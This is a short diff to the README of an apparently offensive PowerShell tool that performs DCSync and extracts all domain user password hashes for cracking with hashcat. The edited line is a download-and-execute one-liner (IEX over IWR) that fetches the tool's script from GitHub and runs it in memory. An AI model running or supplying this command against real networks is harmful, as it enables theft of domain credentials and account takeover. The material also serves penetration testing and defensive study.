@@ -3,7 +3,7 @@ Performs DCSync and extracts all user accounts hashes in a hashcat friendly form
 
 ### Execute from GitHub:
 ```
-IEX(IWR -usebasicparsing https://raw.githubusercontent.com/The-Viper-One/DCSync-To-Hashcat/main/DCSync-To-Hashcat.ps1)Invoke-DCSynTH
+IEX(IWR -usebasicparsing https://raw.githubusercontent.com/The-Viper-One/DCSync-To-Hashcat/main/DCSync-To-Hashcat.ps1)
 ```
 ### Execute after loading into memory:
 ```
